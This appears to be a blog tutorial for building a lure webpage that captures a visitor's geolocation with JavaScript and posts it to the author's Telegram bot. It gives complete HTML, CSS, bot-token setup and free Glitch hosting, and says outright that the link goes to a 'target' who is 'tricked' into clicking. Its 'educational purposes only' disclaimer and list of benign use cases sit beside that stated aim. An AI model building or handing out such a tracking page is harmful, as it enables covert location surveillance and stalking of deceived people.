---
title: "GPS Tracking with HTML & CSS🎯"
date: 2025-01-26 11:04:02 +0330
categories: [Learning, GPS]
tags: [Location, Hack, HTMl, CSS ,Telegram]
description: "Exploiting Location with HTML & CSS + Bot + Free Host"
image: assets/img/Location/location.png
---
# Sending Location with Telegram Bot Using HTML, CSS

This project demonstrates a webpage that collects the user's geolocation and sends it to a Telegram bot using the Telegram Bot API. Below is an explanation of the code and its functionality.

---
## Requirements :
Chat ID : You need to go to the [@userinfobot](https://t.me/userinfobot) bot and copy the id it gives you and paste it into the html code section.<br>
HTML Replace Code : `var chatId = ' Your Chat ID';`
<div style="text-align: center; margin: 20px 0;">
    <img src="assets/img/Location/id.png" alt="id" width="200" height="200">
</div>

Token Bot : You need to go to [@BotFather](https://t.me/@BotFather) and create a bot for yourself. Finally, copy the token and paste it into the html code.<br>
HTML Replace Code : `var botToken = '<Your Bot Token';`
<div style="display: flex; justify-content: center; gap: 20px; margin: 20px 0;">
    <img src="assets/img/Location/botfather.png" alt="botfather" width="200" height="200">
    <img src="assets/img/Location/Token.png" alt="token" width="400" height="400">
</div>


---
## Code Breakdown: 💻

### 2. HTML Structure 📃
You must create the HTML code with the index.html extension, and I have written a simple code for you, you can make changes yourself.

```html
<!DOCTYPE html>
<html>
<head>
  <title>Telegram @i2xAm1r</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <script>
    function sendLocation() {
      navigator.geolocation.getCurrentPosition(function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        var botToken = 'XXXXXXXXXXXXX';  // Replace with your bot token
        var chatId = 'XXXXXXXXXX'; // Replace with your bot token

        var url = 'https://api.telegram.org/bot' + botToken + '/sendLocation';
        var params = {
          chat_id: chatId,
          latitude: latitude,
          longitude: longitude
        };

        var xhr = new XMLHttpRequest();
        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(params));
      });
    }
  </script>
  <div class="login-box">
    <form>
      <a href="#" onclick="sendLocation()">click
        <span></span>
        <span></span>
        <span></span>
        <span></span>
      </a>
    </form>
  </div>
</body>
</html>

```

---

### 3. CSS Styling 📃
Here you also need to create a file called style.css and paste the code.

```css
html {
    height: 100%;
  }
  body {
    margin:0;
    padding:0;
    font-family: sans-serif;
    background: linear-gradient(#141e30, #140101);
  }
  
  .login-box {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 400px;
    padding: 40px;
    transform: translate(-50%, -50%);
    background: rgba(0,0,0,.5);
    box-sizing: border-box;
    box-shadow: 0 15px 25px rgba(0,0,0,.6);
    border-radius: 10px;
  }
  
  .login-box h2 {
    margin: 0 0 30px;
    padding: 0;
    color: #fff;
    text-align: center;
  }
  
  .login-box .user-box {
    position: relative;
  }
  
  .login-box .user-box input {
    width: 100%;
    padding: 10px 0;
    font-size: 16px;
    color: #fff;
    margin-bottom: 30px;
    border: none;
    border-bottom: 1px solid #fff;
    outline: none;
    background: transparent;
  }
  .login-box .user-box label {
    position: absolute;
    top:0;
    left: 0;
    padding: 10px 0;
    font-size: 16px;
    color: #fff;
    pointer-events: none;
    transition: .5s;
  }
  
  .login-box .user-box input:focus ~ label,
  .login-box .user-box input:valid ~ label {
    top: -20px;
    left: 0;
    color: #f40303;
    font-size: 12px;
  }
  
  .login-box form a {
    position: relative;
    display: inline-block;
    padding: 10px 20px;
    color: #ff0000;
    font-size: 16px;
    text-decoration: none;
    text-transform: uppercase;
    overflow: hidden;
    transition: .5s;
    margin-top: 40px;
    letter-spacing: 4px
  }
  
  .login-box a:hover {
    background: #000000;
    color: #fff;
    border-radius: 5px;
    box-shadow: 0 0 5px #000000,
                0 0 25px #03e9f4,
                0 0 50px #03e9f4,
                0 0 100px #ffffff;
  }
  
  .login-box a span {
    position: absolute;
    display: block;
  }
  
  .login-box a span:nth-child(1) {
    top: 0;
    left: -100%;
    width: 100%;
    height: 2px;
    background: linear-gradient(90deg, transparent, #03e9f4);
    animation: btn-anim1 1s linear infinite;
  }
  
  @keyframes btn-anim1 {
    0% {
      left: -100%;
    }
    50%,100% {
      left: 100%;
    }
  }
  
  .login-box a span:nth-child(2) {
    top: -100%;
    right: 0;
    width: 2px;
    height: 100%;
    background: linear-gradient(180deg, transparent, #000000);
    animation: btn-anim2 1s linear infinite;
    animation-delay: .25s
  }
  
  @keyframes btn-anim2 {
    0% {
      top: -100%;
    }
    50%,100% {
      top: 100%;
    }
  }
  
  .login-box a span:nth-child(3) {
    bottom: 0;
    right: -100%;
    width: 100%;
    height: 2px;
    background: linear-gradient(270deg, transparent, #7303f4);
    animation: btn-anim3 1s linear infinite;
    animation-delay: .5s
  }
  
  @keyframes btn-anim3 {
    0% {
      right: -100%;
    }
    50%,100% {
      right: 100%;
    }
  }
  
  .login-box a span:nth-child(4) {
    bottom: -100%;
    left: 0;
    width: 2px;
    height: 100%;
    background: linear-gradient(360deg, transparent, #420e0e);
    animation: btn-anim4 1s linear infinite;
    animation-delay: .75s
  }
  
  @keyframes btn-anim4 {
    0% {
      bottom: -100%;
    }
    50%,100% {
      bottom: 100%;
    }
  }
  
```
---
## Free Host 🍃
I use this site myself and it works fine 👉 [Glitch](https://glitch.com/)
### 1. Glitch config
1. First you create an account, then you click on new project and click on `glitch-hello-website.`
2. Now you need to upload the index.html and style.css files.
3. Now you can copy the address and use it.
<div style="text-align: center; margin: 20px 0;">
    <img src="assets/img/Location/glitch.png" alt="botfather" width="700" height="700">
</div>
<div style="text-align: center; margin: 20px 0;">
    <img src="assets/img/Location/bot.png" alt="token" width="500" height="500">
</div>
<div style="text-align: center; margin: 20px 0;">
    <code style="font-size: 20px; font-weight: bold; padding: 20px;">
        And boom boom, your Bot is ready to use 🥳🤝
    </code>
</div>
<div style="text-align: center; margin: 20px 0;">
    <code style="font-size: 20px; font-weight: bold; padding: 20px;">
        Now when you send address to target and it is tricked and clicks, the location will be sent to your bot.✅
    </code>
</div>
---

## Use Case:
This code can be used to collect and send location data to Telegram for various purposes, such as:
- Emergency response systems.
- Custom location tracking for specific users.
- Automation tasks requiring location information.

---

##  Disclaimer 🤝
This document and its accompanying code are provided for **educational purposes only**. The author is not responsible for any misuse or damage caused by the use of this information.

--- 
## Social Media 

<a href="https://instagram.com/2xAm1r" target="_blank">
    <i class="fab fa-instagram"></i> Instagram
</a><br>

<a href="https://t.me/I2xAm1r" target="_blank">
    <i class="fab fa-telegram"></i> Telegram
</a><br>

<a href="https://github.com/i2xAm1r" target="_blank">
    <i class="fab fa-github"></i> GitHub

[![Discord server](https://discordapp.com/api/guilds/938143724565835848/embed.png?style=banner3)](https://discord.gg/WtPzSe94)

---